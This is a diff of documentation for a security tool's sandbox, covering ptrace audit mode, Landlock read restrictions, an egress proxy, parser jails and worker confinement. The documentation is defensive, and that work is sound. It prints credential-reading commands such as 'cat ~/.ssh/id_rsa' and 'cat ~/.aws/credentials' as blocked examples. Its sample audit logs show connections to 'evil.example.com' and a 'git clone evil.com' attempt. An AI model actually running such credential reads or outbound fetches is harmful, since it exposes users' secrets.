-| Network (`connect` syscall) | tracer decodes sockaddr (AF_INET / AF_INET6) to `ip:port`, compares port against `allowed_tcp_ports` (typically the egress-proxy port) | filtered mode logs only would-be-blocked ports; verbose mode logs every connect attempt. Distinct from the egress-proxy row above — this catches direct `connect()` syscalls that don't go through the proxy. |
-
-The tracer is a Python subprocess (`core.sandbox.tracer`) running on
-the same host. It attaches to the target via `PTRACE_SEIZE` with
-`TRACEFORK | TRACEVFORK | TRACECLONE` so multi-process workloads
-(`make -j N`) audit every subprocess. `PTRACE_O_EXITKILL` ensures
-that if the tracer dies, the kernel cascades `SIGKILL` to all
-tracees rather than letting them `SIGSYS`-die on the next traced
-syscall.
-
-Records merge into the same `sandbox-summary.json` that
-`record_denial`'s `audit=True` entries write to — operators see one
-unified view across all three layers.
-
-**Degradation when ptrace is unavailable** (Yama scope 3, container
-`--cap-drop SYS_PTRACE`, restrictive container seccomp):
-
-- Network audit still works (no ptrace dependency).
-- Syscall + filesystem audit silently degrade to enforcement (the
-  `SCMP_ACT_TRACE` swap is skipped because TRACE without an attached
-  tracer SIGSYS-kills the target).
-- A one-time WARNING surfaces the degradation with workaround
-  pointers (run outside container, set `kernel.yama.ptrace_scope=1`).
-
-**Audit-coverage gaps (acknowledged):**
-
-- File operations performed via `io_uring` SQEs (submission queue
-  entries written to shared memory after `io_uring_setup`) bypass
-  the syscall layer entirely and are invisible to seccomp tracing.
-  Mitigation: every `io_uring_setup` audit record carries an
-  explicit `note` field warning that subsequent ring operations
-  by the same process are untraceable. RAPTOR's seccomp blocklist
-  already disallows `io_uring_setup` under `full`/`debug` (so the
-  ring never gets created in enforcement mode); under `--audit` it
-  is logged-and-allowed but operators see the gap explicitly in
-  the record.
-- Anti-debug detectable via `/proc/self/status`'s `TracerPid`
-  field, ptrace self-test, or syscall timing. Audit mode is for
-  operator workflows (gcc, make, python, claude sub-agents) — none
-  of which evade observation. Hiding ptrace presence from a
-  hostile tracee requires kernel-level instrumentation (out of
-  scope; see "Anti-debug surface" below).
-
-`openat2(2)` (Linux 5.6+) IS in the trace set. The flags-bit
-extraction reads the first 8 bytes of the `struct open_how`
-pointer via `process_vm_readv` — the same plumbing used for path
-strings. If the deref fails (bad pointer), the tracer
-conservatively treats the call as write-intent so the record is
-NOT silently dropped from filtered mode.
-
-**Audit-record integrity.** When `audit_run_dir=` is supplied
-explicitly (e.g. by `codeql/agent.py`, `query_runner.py`), the
-audit JSONL lives in a directory that is NOT in `writable_paths`,
-so the traced target cannot open it for append — a hostile target
-cannot inject false records. When `audit_run_dir` is omitted and
-the legacy `output=` fallback is used, the JSONL DOES live inside
-the target's writable surface and a hostile target could append
-garbage. Mitigations regardless of mode:
-
-- `O_NOFOLLOW` defends against symlink swaps (target can't
-  redirect the JSONL to a different file).
-- Records are operator-visible signal, not authoritative truth.
-
-**Recommendation:** for sandbox calls handling untrusted content
-where audit signal must survive a hostile target, pass
-`audit_run_dir=` explicitly to a directory the target cannot
-write to. The kwarg also avoids the Landlock writable-path
-restriction that comes with `output=`.
-
-**Performance.** Audit mode adds:
-
-- ~200 ms of fixed setup cost per sandbox call (tracer fork + execvpe
-  + PTRACE_SEIZE + sync handshake + teardown)
-- ~5 ms of per-traced-syscall overhead (kernel pauses tracee on
-  SCMP_ACT_TRACE → context switch to tracer → register read → path
-  resolution + allowlist check → PTRACE_CONT → context switch back)
-
-Measured on a Python startup + short script benchmark on Ubuntu 24.04
-/ Python 3.13: `--audit` ≈ `--audit --audit-verbose` ≈ 3.5x `--sandbox full`
-alone. The per-call setup cost dominates short workloads.
-
-Filtered (`--audit`) and unfiltered (`--audit --audit-verbose`) run at
-essentially the same speed — the filter only saves the JSONL write
-cost, not the per-syscall ptrace context switch. The OPERATOR-VISIBLE
-difference is record volume (filtered: a handful, verbose: thousands)
-not wall-clock time.
-
-Use audit mode for diagnosis, not routine work. Drop `--audit` for
-production scans (the profile alone runs at full speed).
-
-**Disk usage cap.** Both filtered and verbose modes are routed
-through `core.sandbox.audit_budget.AuditBudget` (default global
-cap 10000, mirrors `core/sandbox/summary.py`'s `MAX_DENIALS_PER_RUN`).
-Per record is bounded by `MAX_CMD_LEN = 2048` bytes after
-truncation — upper bound on the JSONL is ≈ 20 MB. The budget also
-enforces per-category sub-caps (file-write 3000, file-read-data
-2000, etc.) and per-PID caps (5000) so one chatty source can't
-squeeze out the others. Operators see `category_budget_exceeded`
-and `pid_budget_exceeded` markers in the JSONL when caps fire, and
-an `audit_summary` record at end-of-run with totals. Override the
-global cap via `--audit-budget=N` (sub-caps scale proportionally).
-See the "Audit budget" section below for the full mechanism.
-
-**Anti-debug surface (acknowledged, acceptable).** Code in an
-audited sandbox can detect tracing via `/proc/self/status`'s
-`TracerPid` field, ptrace self-test, or syscall timing. Audit mode
-is for operator workflows (gcc, make, python, claude sub-agents) —
-none of which evade observation. RAPTOR is not a malware-analysis
-sandbox; if that use case ever lands, anti-anti-debug is a separate
-engineering effort.
-
-### What audit-mode output looks like
-
-After a `--audit` run completes, inspect the run's output directory.
-There are three possible states; each one writes a different file (or
-no file) so you can tell them apart at a glance:
-
-**1. Audit ran and recorded events** — `sandbox-summary.json` is
-present. Each entry includes an `audit: true` field so you can filter
-"would-have-been-blocked" events from real enforcement events
-(both can coexist — audit-mode keeps the network proxy in
-log-and-allow but hard-fails on a real Landlock denial elsewhere):
-
-```json
-{
-  "run_dir": "/path/to/run",
-  "generated_at": "2026-04-27T15:00:00Z",
-  "total_denials": 2,
-  "by_type": {"network": 1, "seccomp": 1},
-  "denials": [
-    {"ts": "2026-04-27T15:00:01Z",
-     "cmd": "claude --model gemini-2.5-pro",
-     "returncode": 0, "type": "network",
-     "host": "evil.example.com", "port": 443,
-     "audit": true,
-     "suggested_fix": "audit: outbound network to `evil.example.com` would be blocked under `--sandbox full`"},
-    {"ts": "2026-04-27T15:00:03Z",
-     "cmd": "make -j4",
-     "returncode": 0, "type": "seccomp", "syscall": "ptrace",
-     "audit": true,
-     "suggested_fix": "syscall blocked by seccomp; use `--sandbox debug` (allows ptrace) or `--sandbox network-only`/`--sandbox none` (drops seccomp)"}
-  ]
-}
-```
-
-**2. Audit ran, no enforcement events** — no `sandbox-summary.json`
-and no degraded marker. The workflow ran and nothing it did would
-have been blocked. (This is success.)
-
-**3. Audit was requested but didn't actually run** —
-`sandbox-audit-degraded.json` is present. Most often: Ubuntu 24.04
-default (`apparmor_restrict_unprivileged_userns=1`) blocks the
-mount-ns path, which the tracer needs to attach. Network audit (b1)
-still works, but syscall + filesystem audit (b2/b3) silently degrade
-to enforcement.
-
-```json
-{
-  "audit_requested": true,
-  "audit_engaged": false,
-  "degraded": true,
-  "reason": "mount-ns / spawn-path unavailable; tracer cannot attach",
-  "instructions": "set kernel.apparmor_restrict_unprivileged_userns=0 (Ubuntu 24.04+) and install the uidmap package; or rerun on a host where mount-ns is available.",
-  "generated_at": "2026-04-27T15:00:00Z"
-}
-```
-
-If you see this marker, follow the `instructions` field and rerun.
-Without the marker, an empty result genuinely means "audit ran,
-nothing would be blocked" — distinguishable from "audit didn't run".
-
-## Configuration
-
-All kwargs accepted by `sandbox()` and `run()` (and most by `run_untrusted()`):
-
-| Kwarg | Default | Meaning |
-|---|---|---|
-| `target` | `None` | Path to attacker-derived content. Read-only inside sandbox; engages Landlock. |
-| `output` | `None` | Scratch area. Writable inside sandbox; engages Landlock. |
-| `block_network` | `False` | Unshare network namespace — no interfaces inside. |
-| `allowed_tcp_ports` | `None` | Landlock TCP-connect allowlist (ABI v4+, kernel 6.7+). Mutually exclusive with `block_network=True`. |
-| `limits` | built-in defaults | Resource caps: `memory_mb`, `max_file_mb`, `cpu_seconds`. |
-| `profile` | `None` | Named profile (see table above). Overrides individual layer flags. |
-| `disabled` | `False` | Shortcut for `profile='none'`. |
-| `map_root` | `False` | Map caller UID to root inside namespace (for tools that check `getuid()==0`). |
-| `use_egress_proxy` | `False` | Route outbound HTTPS through the RAPTOR proxy with a hostname allowlist. See [Egress proxy](#egress-proxy). |
-| `proxy_hosts` | `None` | Hostname allowlist for the egress proxy. Required when `use_egress_proxy=True`. |
-| `restrict_reads` | `False` (`True` in `run_untrusted`) | Flip Landlock to allowlist-only reads (blocks `$HOME`, custom paths, etc.). |
-| `readable_paths` | `None` | Extra paths to add to the read allowlist. Ignored when `restrict_reads=False`. |
-| `fake_home` | `False` (`True` in `run_untrusted`) | Override child `HOME` + `XDG_*_HOME` to `{output}/.home/`. Requires `output`. |
-| `caller_label` | `None` | Short identifier stamped onto every proxy event emitted during this sandbox's lifetime. Lets you tell apart concurrent/sequential callers in `proxy-events.jsonl`. |
-| `tool_paths` | `None` | Extra dirs to bind-mount into the mount-ns sandbox so a non-system tool's binary + dependencies are visible. Speculative — if mount-ns engages with the supplied bind set but the tool fails at exec (typical Python tool with native exec deps not in any reasonable bind set), the sandbox automatically retries via Landlock-only. Worst-case: same isolation as not passing `tool_paths` at all. Per-cmd cache prevents repeated retry overhead within a process. See [Mount-ns tool visibility](#mount-ns-tool-visibility) below. |
-| `audit_run_dir` | `None` | Directory where audit JSONL lands when `--audit` is engaged. **Decoupled from `output=`** — passing this does NOT add the directory to Landlock `writable_paths`, so callers like `codeql analyze` (which legitimately writes to `~/.codeql`, the database dir, etc.) can collect audit signal without taking a writable-path restriction that would break the workflow. Falls back to `output=` when not supplied (preserves pre-existing behaviour). For untrusted-target audit, prefer `audit_run_dir=` over `output=` so a hostile target can't inject false records into the JSONL (the audit dir is unreachable from the target's writable surface). |
-
-> **`env=` passthrough.** If you pass an explicit `env=` dict to `run()`, it
-> is forwarded verbatim to the child — `RaptorConfig.get_safe_env()` is NOT
-> applied (we log an INFO-level note when this happens). `env=None` or omitting
-> `env=` engages the safe-env path. Callers opting into custom `env=` own the
-> sanitisation of what they pass.
-
-### Mount-ns tool visibility
-
-The mount-ns sandbox bind-mounts a fixed set of system dirs (`/usr`,
-`/lib`, `/lib64`, `/etc`, `/bin`, `/sbin`) plus `target`/`output`
-plus a per-sandbox `/tmp` tmpfs. **Anything else is invisible inside
-the sandbox** — invoking a tool at `~/.local/bin/X`, `/opt/homebrew/bin/X`,
-or `~/bin/X` would otherwise produce ENOENT (subprocess exit 127)
-with empty stderr.
-
-Two mechanisms keep workflows running regardless of the tool's
-install location:
-
-**Auto-fallback (no caller cooperation needed).** If `cmd[0]`
-resolves to a path outside the mount-ns bind tree, the sandbox skips
-mount-ns and runs the call at Landlock-only isolation. The workflow
-proceeds; isolation matches the Ubuntu-default posture (where
-mount-ns never engages anyway because the apparmor sysctl gates
-unprivileged user-ns). Logged at DEBUG.
-
-**`tool_paths=` opt-in.** Callers that know their tool's install
-layout pass `tool_paths=[<bin_dir>, <lib_dir>, ...]`. Those dirs are
-bind-mounted read-only into the mount-ns sandbox so the tool is
-visible. **Speculative**: if the bind set turns out insufficient
-(mount-ns engages but the tool fails at exec — typical of Python
-tools whose native exec deps live outside any reasonable bind set),
-the sandbox automatically retries via Landlock-only. First failure
-per binary fires one INFO log; subsequent calls hit a per-cmd cache
-and skip the doomed mount-ns attempt directly.
-
-When to use what:
-
-- **Standalone binary in a system dir** (`/usr/local/bin/`): no
-  action needed; mount-ns engages cleanly.
-- **Standalone binary outside system dirs** (e.g. `/opt/foo/bin/foo`
-  with all deps in `/opt/foo/`): pass `tool_paths=["/opt/foo"]`.
-  Mount-ns engages with `/opt/foo` bind-mounted.
-- **Self-contained distribution** (codeql ships at
-  `~/.local/share/codeql/` with java/, lib/, packs/ siblings): pass
-  `tool_paths=[<codeql_install_dir>]`. Mount-ns engages.
-- **Python tools** (semgrep, etc.): pass `tool_paths=` covering the
-  bin dir + Python stdlib dir. Often works; sometimes the tool also
-  exec's native binaries from elsewhere — speculative retry catches
-  it. Worst case: same as no `tool_paths` (Landlock-only).
-
-The cache is per-process: a fresh RAPTOR invocation re-probes (so
-operators changing their install layout don't see stale cache hits).
-
-### Read restriction (`restrict_reads` + `fake_home`)
-
-Under `run_untrusted()`, both default to `True`. This is the primary defence
-against credential exfiltration:
-
-- `restrict_reads=True` — Landlock blocks reads outside the system-dir
-  allowlist (`/usr`, `/lib`, `/lib64`, `/etc`, `/proc`, `/sys`, `target`,
-  `output`, `/tmp`, and curated `/dev` files). `$HOME` is **not** on the
-  allowlist.
-  - `/dev` is narrowed: `/dev/null`, `/dev/tty` (writable), plus `/dev/zero`,
-    `/dev/full`, `/dev/random`, `/dev/urandom`, `/dev/tty` (readable). Does
-    not include `/dev/shm`.
-  - `/proc` is wholesale allowlisted, but cross-process
-    `/proc/<host_pid>/environ` reads are still blocked: `restrict_reads=True`
-    also triggers a PID-namespace unshare, and the kernel's per-ns `/proc`
-    access check denies reads of any host-pid `/proc/<pid>/environ` even
-    though `/proc` is visible. This stops a compromised child lifting
-    `ANTHROPIC_API_KEY` and other credentials out of the parent RAPTOR
-    process's environment when running in Landlock-only mode (no
-    `block_network=True`, no mount-ns). The PID ns also hides host PIDs
-    for `kill()` / `ptrace()`.
-- `fake_home=True` — child's `HOME`, `XDG_CONFIG_HOME`, `XDG_CACHE_HOME`,
-  `XDG_DATA_HOME`, `XDG_STATE_HOME` all point at `{output}/.home/` — an
-  empty directory created fresh per sandbox. Tools see no dotfiles.
-
-Together they ensure:
-
-- `cat ~/.ssh/id_rsa` → ENOENT (home is empty)
-- `cat /home/user/.ssh/id_rsa` → EACCES (absolute path blocked by Landlock)
-- `cat ~/.aws/credentials` → ENOENT
-- `cat ~/.config/raptor/models.json` → ENOENT
-
-If a tool genuinely needs a config file, pre-populate the fake home before
-calling:
-
-```python
-import shutil, os
-
-os.makedirs(f"{out}/.home", exist_ok=True)
-shutil.copy(os.path.expanduser("~/.gitconfig"), f"{out}/.home/.gitconfig")
-run_untrusted(["git", "...args..."], target=repo, output=out)
-```
-
-Or extend the read allowlist:
-
-```python
-run_untrusted(
-    cmd, target=repo, output=out,
-    readable_paths=["/opt/jdk", "/var/cache/debconf"],
-)
-```
+---
 
 ## Egress proxy
 
-An in-process HTTPS-CONNECT proxy lets callers allow a specific set of hostnames
-while still blocking everything else. Use it when the tool needs one or two
-API endpoints (e.g. Claude sub-agent, CodeQL pack download) but you don't want
-to open the full network.
+An in-process HTTPS-CONNECT proxy lets a sandboxed tool reach a
+specific set of hostnames while everything else stays blocked — used
+when a tool needs one or two API endpoints (a Claude sub-agent,
+a CodeQL pack download) but should not get open network.
 
-```python
-from core.sandbox import run
-
-run(
-    ["claude", "..."],
-    target=repo, output=out,
-    use_egress_proxy=True,
-    proxy_hosts=["api.anthropic.com"],
-    caller_label="claude-sub-agent",
-)
-```
-
-How it works:
-
-- A daemon thread runs an asyncio HTTP-CONNECT proxy on a loopback port.
-- Child env gets `HTTPS_PROXY` and `http_proxy` set to that port; most tools
-  (curl, pip, Java/CodeQL) honour these.
-- Landlock restricts TCP `connect()` to the proxy's port, so the child
-  cannot bypass it.
-- Seccomp blocks `AF_INET`/`AF_INET6` `SOCK_DGRAM`, closing the DNS-exfil
-  path.
-- The proxy rejects any `CONNECT` to a hostname not on the allowlist.
+- The child's `HTTPS_PROXY`/`http_proxy` point at a loopback port; the
+  proxy rejects any `CONNECT` to a hostname not on the allowlist.
 - Resolved IPs are screened — loopback, private, link-local, multicast,
-  reserved, and unspecified addresses are rejected even if the hostname
-  was on the allowlist. (When an upstream HTTPS proxy is configured, IP
-  screening is skipped because the upstream handles DNS.)
+  and reserved addresses are rejected even for allowlisted hostnames
+  (DNS-rebinding defence).
+- Enforcement is tiered, strongest available first: an empty network
+  namespace where the proxy is the only reachable endpoint; a
+  Landlock pin to the proxy's port plus a UDP block (closing DNS
+  exfiltration) when namespaces are unavailable; environment variables
+  alone as the last resort. Runs record which tier engaged.
 
-Multiple callers share one proxy singleton; their hostname allowlists are
-union'd. Event observability is **per-run**, not shared: each `run()` call
-(whether inside a `with sandbox()` block or via the top-level `run()`)
-calls `register_sandbox(caller_label)` before spawning the subprocess,
-gets a token, and the proxy fans every event generated during that
-subprocess into the token's own buffer. On subprocess exit the sandbox
-calls `unregister_sandbox(token)` to drain and stamp the events with
-`caller_label`. Concurrent sandboxes therefore each get the full event
-stream for their lifetime — one noisy caller can't mask another's events.
+### Binary inspection
 
-For a `with sandbox(...)` block with multiple `run()` calls, each
-individual `result.sandbox_info["proxy_events"]` holds that specific
-subprocess's slice. The **cumulative** view across every run in the
-block is exposed as `run.events` — a live list appended to on each
-inner `run()` call:
+Read-only binary inspection and the binary oracle treat ELF/DWARF parsing as
+untrusted work, even though RAPTOR selects the tools. Their sandbox allows
+reads of system runtime files, the binary's directory (including sibling debug
+files), and declared tool runtime paths. HOME, working directory and temporary
+files use disposable scratch; the input directory remains read-only.
 
-```python
-with sandbox(use_egress_proxy=True, proxy_hosts=["api.example.com"]) as run:
-    run(["curl", "https://api.example.com/a"])
-    run(["curl", "https://api.example.com/b"])
-    print(run.events)  # combined list covering both calls
-```
+Keep binaries in a dedicated directory. A binary directly in HOME or the shared
+temporary base is refused because admitting its parent would expose unrelated
+files. The usual sandbox floor and explicit consent settings apply. An isolation
+refusal is reported as a sandbox error, rather than an empty analysis result.
+For a toolchain installed outside standard locations, use `--sandbox-tool-path`
+to declare any additional runtime directories it needs.
+
+The interactive radare2 wrapper uses this policy too, preserving r2pipe's
+stdin/stdout protocol while pinning HOME, temporary files and cwd to its
+scratch directory. It resolves the selected `r2`/`radare2` before environment
+sanitisation and declares its tool paths. The optional `R2_TARGET_DIR` hint
+must match the resolved input's parent; it cannot widen the read grant.
+An explicit `radare2home` launcher selects the wrapper even when r2pipe
+ignores `R2PIPE_R2`; its control directory is outside writable parser scratch.
+Sandbox floor refusals exit through the wrapper's existing error contract.
+
+### SMT verification workers
+
+SMT/Z3 verification helpers run under the shared untrusted sandbox floor,
+with read-only RAPTOR code and installed dependencies, private HOME/TMP/cwd
+and blocked networking. Requests carry source snippets and resolved vocabulary
+data, never filesystem grants derived from a target path. User-site Python
+hooks run only after confinement. Compound checks share the existing worker
+rather than starting nested sandboxes.
+
+Requests are capped at 4 MiB and replies at 1 MiB, with depth/node limits and
+rejection of duplicate keys and nonfinite numbers. Anonymous result files and
+bounded parent reads prevent stdout/stderr floods from filling parent memory;
+worker file size is limited to 16 MiB. Each worker has a 2 GiB
+address-space limit, a CPU budget matched to the requested timeout, and a wall
+timeout (10 seconds by default). Linux enforces the address-space cap; macOS
+provides process separation and wall/CPU limits with best-effort address-space
+enforcement. Limits are per worker, not an aggregate host memory budget.
+Worker crashes, timeouts and invalid replies return no solver result;
+isolation refusals remain explicit errors. No bare subprocess fallback exists.
+
+### ELF library inspection
+
+Exploit-feasibility pwntools inspection runs in a disposable sandbox worker.
+RAPTOR receives a bounded JSON record of architecture and mitigation facts;
+worker crashes, timeouts and invalid replies fall back to sandboxed readelf.
+Isolation refusals remain errors. The existing bounded stdlib ELF fallback
+remains available for basic architecture detection.
+
+The worker uses private HOME, cwd and temporary storage, read-only input/code
+paths and the normal untrusted sandbox floor. Installed user-site Python
+packages remain supported, with their startup hooks running only inside the
+sandbox. PLT emulation is disabled; FORTIFY is inferred from imported function
+names rather than depending on Unicorn memory reservations.
+
+Input is capped at 512 MiB before the pwntools lane. Each worker has a 20-second
+wall timeout, a 10-second CPU cap and a 2 GiB address-space cap; it cannot fork
+after loading its dependencies. Linux enforces the address-space limit. macOS
+provides process separation and wall/CPU limits, but its address-space limit is
+best effort. These are per-worker limits, not an aggregate host memory budget.
+
+### Gadget parser runtimes
+
+ROPgadget and one_gadget use the same restricted inspection workspace and
+untrusted sandbox floor as binutils. Python launcher dependencies are declared
+without running the launcher. Ruby queries its own runtime inside the sandbox,
+without the target directory or account configuration, before one_gadget runs.
+
+User-installed gems remain usable through read-only grants for gem code,
+specifications and extensions. A gem root can be anywhere: standard RubyGems
+locations, conventional user directories and roots adjacent to the launcher are
+discovered automatically. For a custom `GEM_HOME`, RVM installation or trusted
+Bundler gem directory, declare the gem root with `--sandbox-tool-path /path/to/gems`.
+Ambient `GEM_HOME`/`GEM_PATH`, `.gemrc` and target Bundler files do not widen the
+sandbox. Unsupported launcher shims may also need explicit interpreter/runtime
+paths; failures do not fall back to unrestricted execution.
+
+### Request-line parser jail
+
+The proxy never interprets a client's raw request-line bytes in its
+own process. Those bytes come straight from sandboxed (potentially
+compromised) code, so parsing them — the decode, the method split, the
+host/port extraction — is delegated to a dedicated, long-lived worker
+process that does nothing else. The proxy sends each raw line to the
+worker and consumes only a small structured verdict, re-validating
+every field (type, length, charset, range) before using it; a worker
+that deviates from the protocol in any way is killed and respawned,
+and the request that hit the deviation is refused.
+
+The worker confines itself at startup, in layers:
+
+- Every inherited file descriptor is closed except the single socket
+  to the proxy; stdio is bound to `/dev/null`.
+- Resource limits: a CPU budget that kills a runaway parse, an
+  address-space cap, a file-descriptor cap, zero file writes, and
+  zero forks.
+- Landlock (when the kernel supports it): read-only access to its own
+  code trees, no writes anywhere, no network.
+- Requests carry unpredictable random ids, and the proxy checks for
+  unsolicited buffered bytes before each send — a worker that
+  pre-queues a forged verdict or volunteers data is killed rather
+  than believed.
+
+There is no inline-parse fallback. If no confined worker can be
+spawned, the proxy refuses to start; if the worker becomes
+unavailable mid-run, affected requests are answered `503` and
+recorded as `parser_unavailable` events — the bytes are never parsed
+in-process instead.
+
+On kernels without Landlock the worker steps down to the remaining
+layers (resource limits, descriptor hygiene, process isolation) and
+says so loudly: a one-time warning at startup and a
+`parser_jail_degraded` event in every registration's audit stream.
+If Landlock is available but its policy fails to install, the worker
+does not serve at all — that is a fault, not a degradation.
+
+Method accounting is unaffected: the `requests_connect` /
+`requests_non_connect` counters keep their historical meaning, fed by
+a classification the worker returns with each verdict.
 
 ### Upstream proxy support
 
-If `HTTPS_PROXY` is set in the parent environment (e.g. corporate proxy), the
-RAPTOR proxy forwards its `CONNECT` tunnels through that upstream. `NO_PROXY` /
-`no_proxy` are honoured for the upstream decision. This is transparent to
-callers.
-
-## Observability
-
-`sandbox_info` is attached to each `run()` return value and captures what
-actually happened:
-
-```python
-from core.sandbox import sandbox
-
-with sandbox(target=repo, output=out, use_egress_proxy=True,
-             proxy_hosts=["api.anthropic.com"]) as run:
-    result = run(cmd)
-    info = result.sandbox_info
-
-    # Keys are populated on demand — check with .get():
-    print(info.get("crashed"), info.get("signal"))    # termination reason
-    print(info.get("sanitizer"))                       # asan/ubsan/msan/tsan
-    print(info.get("evidence"))                        # factual summary string
-    print(info.get("blocked"))                         # sandbox-enforcement events
-    print(info.get("proxy_events"))                    # list of connect attempts
-```
+If `HTTPS_PROXY` is set in the parent environment (e.g. corporate
+proxy), the RAPTOR proxy forwards its `CONNECT` tunnels through that
+upstream, honouring `NO_PROXY`. This is transparent to callers. The
+upstream handshake has one total budget (default 10 s) covering the TCP
+connection, request write, status line and response headers; slow or
+authenticated corporate proxies can widen it with
+`RAPTOR_PROXY_UPSTREAM_HANDSHAKE_TIMEOUT_S` — the signal you need it is
+`upstream_failed` events in `proxy-events.jsonl` on a proxy that is
+otherwise working. A complete HTTP/1.0 or HTTP/1.1 200 response head is
+required before the client receives success. Incomplete, malformed or
+over-budget responses produce a 502 and an `upstream_failed` event.
 
 ### Proxy events
 
-When `use_egress_proxy=True`, every CONNECT attempt is recorded:
+Every CONNECT attempt is recorded and persisted to
+`{output}/proxy-events.jsonl`:
 
 ```json
 {
@@ -534,147 +692,808 @@ When `use_egress_proxy=True`, every CONNECT attempt is recorded:
 ```
 
 Results: `allowed`, `denied_host`, `denied_resolved_ip`, `dns_failed`,
-`upstream_failed`, `timed_out`, `bad_request`, `handler_error`. `t` is
-`time.monotonic()` seconds (monotonic across clock jumps, not wall time).
-`caller` is added from `caller_label=` when set.
+`upstream_failed`, `timed_out`, `bad_request`, `handler_error`, plus
+`would_deny_host` in [audit mode](#audit-mode).
 
-Events are also persisted to `{output}/proxy-events.jsonl` when `output` is
-set — useful for post-run auditing. Each sandbox's buffer grows independently
-for its lifetime (no fixed cap, no ring-buffer eviction); the buffer is
-discarded when the sandbox context exits.
+---
 
-### Per-run denial summary
+## LLM dispatcher response-scan jail
 
-For commands that go through the lifecycle helpers (`core.run.metadata.start_run`
-/ `complete_run` / `fail_run` / `cancel_run` — i.e., everything driven by
-`/scan`, `/agentic`, `/codeql`, `/validate`, `/understand`, `/fuzz`, etc.), every
-sandbox enforcement event seen during the run is aggregated into
-`{run_dir}/sandbox-summary.json` at run-end.
+The credential-isolation dispatcher books spend-capped ("scoped")
+token usage from the response bytes it relays — bytes sent by a
+remote LLM backend and embedding model-authored text. Interpreting
+them (SSE line splitting, JSON parsing, the truncation-recovery
+scans) is delegated to a dedicated, long-lived worker process, the
+same pattern as the [request-line parser
+jail](#request-line-parser-jail): the dispatcher — the process
+holding every provider API key — sends the bounded head/tail windows
+it retained and consumes only a small structured usage verdict,
+re-validating every field before the spend ledger sees it. A worker
+that deviates from the protocol is killed and respawned; values an
+honest worker could legitimately relay from a hostile upstream are
+sanitised (model strings) or clamped (token counts) rather than
+trusted. The worker self-confines exactly like the parser-jail
+worker: descriptor hygiene, resource limits (CPU, address space,
+zero writes, zero forks), and Landlock (read-only code trees, no
+network) when the kernel supports it. Because scans recur for every
+relayed response, the worker is also proactively recycled between
+scans so its lifetime CPU budget never interrupts an honest run.
 
-Format:
+Unlike the parser jail, this jail degrades by HOST CAPABILITY —
+never by input — through three tiers, announcing a step-down with
+exactly one warning per process:
+
+1. **Full jail** (`jail_landlock`) — process isolation, descriptor
+   hygiene, sanitised environment, resource limits, Landlock.
+2. **Jail without Landlock** (`jail_no_landlock`) — the kernel lacks
+   Landlock: everything above minus the Landlock policy.
+3. **In-process scan** (`in_process`) — the worker cannot run at all
+   on this host (spawning keeps failing on a Landlock-incapable
+   kernel): the scan runs in the dispatcher process via the same
+   pure scan core, the pre-jail behaviour.
+
+Every `child_token.spend` audit row records the serving tier in
+`usage_scan_tier`.
+
+On a kernel where Landlock IS available, an unspawnable or
+unconfinable worker is a fault, not a degradation — the dispatcher
+fails closed: scoped-token requests are refused `503` before any
+upstream byte is spent, recorded as `usage_scan.unavailable` events
+(relaying a spend-capped token's response unbooked would silently
+disable the cap). Worker-token relays carry no scanner and are
+unaffected, and the next scoped request retries the spawn under
+backoff. The in-process tier is never used on a Landlock-capable
+kernel, and never because a particular response crashed the worker:
+a mid-scan worker death books that response as `scan_failed` — a $0
+booking made loud with a warning and a `scan_failed` flag on the
+spend row, mirroring the `unscanned_response` contract — and the
+next scan is served by a fresh worker. The poison bytes are never
+handed to an in-process parser.
+
+---
+
+## Audit and observe modes
+
+### Audit mode
+
+`--audit` (composed with any compatible profile) runs a workflow to
+completion AND records what enforcement WOULD have blocked. It is the
+soft-default fallback when `full` is too strict for a workload but you
+want visibility into policy violations -- far better than
+`--sandbox none`.
+
+Audited layers: the egress-proxy hostname gate logs-and-allows (the
+resolved-IP block stays enforcing), blocked syscalls are traced and
+logged instead of denied — **except escape primitives** (ptrace family,
+keyctl, bpf, userfaultfd, io_uring, tty-injection ioctls, and — on the
+lane that blocks it — namespace creation), which stay hard-denied even
+under audit — and file opens / network connects that
+would have been blocked are logged with the offending path or address.
+
+| Invocation | Effect |
+|---|---|
+| `--sandbox full` (default) | Full enforcement |
+| `--sandbox full --audit` | Full layout, would-be-blocked events logged |
+| `--sandbox full --audit --audit-verbose` | Logs EVERY traced syscall (strace-style) |
+| `--sandbox debug --audit` | gdb-friendly seccomp + audit signal |
+| `--sandbox network-only --audit` | Only the egress-proxy gate audits |
+| `--sandbox none --audit` | **Error** -- incoherent (nothing to audit against) |
+| `--audit-verbose` without `--audit` | **Error** |
+
+Audit mode adds roughly 3.5x overhead versus plain `full` (per-syscall
+tracing), so use it diagnostically, not as the standing default.
+
+**Degradation when ptrace is unavailable** (Yama scope 3, container
+`--cap-drop SYS_PTRACE`): network audit still works; syscall and
+filesystem audit degrade to enforcement. The degradation is loud: a
+WARNING plus a `sandbox-audit-degraded.json` marker (reason +
+remediation) in the audit target.
+
+### Observe mode
+
+Observe mode is a superset of audit that additionally traces
+stat-family syscalls, producing a profile of every path the binary
+read or wrote and every network target it tried. Use it to derive a
+read allowlist or an egress hostname allowlist from actual behaviour:
+
+```bash
+raptor-sandbox-observe -- /usr/bin/true           # human summary
+raptor-sandbox-observe --json -- ./scan-target    # machine-readable profile
+```
+
+Programmatic consumers parse the observe log into an `ObserveProfile`
+(`parse_observe_log`) with `paths_read`, `paths_written`, and
+`connect_targets`; the profile can also be merged into a `/understand`
+context map to corroborate static analysis with runtime evidence.
+
+### Audit budget
+
+`--audit-budget=N` (default 10000) caps records per run. Per-category
+and per-PID sub-caps stop one chatty category or spamming subprocess
+from squeezing everything else out, a token bucket lets long-running
+workloads at low steady-state run indefinitely, and high-volume
+categories keep emitting a sampled trickle after their cap so you can
+see "still happening". Budget markers appear in the JSONL alongside
+data records.
+
+### Audit output
+
+After a `--audit` run completes, inspect the run's output directory.
+Three possible states:
+
+**1. Audit ran and recorded events** -- `sandbox-summary.json` is
+present. Each entry includes `audit: true`:
 
 ```json
 {
   "run_dir": "/path/to/run",
   "generated_at": "2026-04-27T15:00:00Z",
-  "total_denials": 3,
-  "by_type": {"network": 1, "write": 1, "seccomp": 1},
+  "total_denials": 2,
+  "by_type": {"network": 1, "seccomp": 1},
   "denials": [
-    {"ts": "...", "cmd": "git clone evil.com",
-     "returncode": 1, "type": "network",
-     "suggested_fix": "outbound network blocked; use `--sandbox none` to allow network (or accept the block)"},
-    {"ts": "...", "cmd": "tool /etc/blocked",
-     "returncode": 1, "type": "write", "path": "/etc/blocked",
-     "suggested_fix": "write outside allowed paths blocked to `/etc/blocked`; use `--sandbox network-only` or `--sandbox none` to drop Landlock (or move write into target dir)"},
-    {"ts": "...", "cmd": "...",
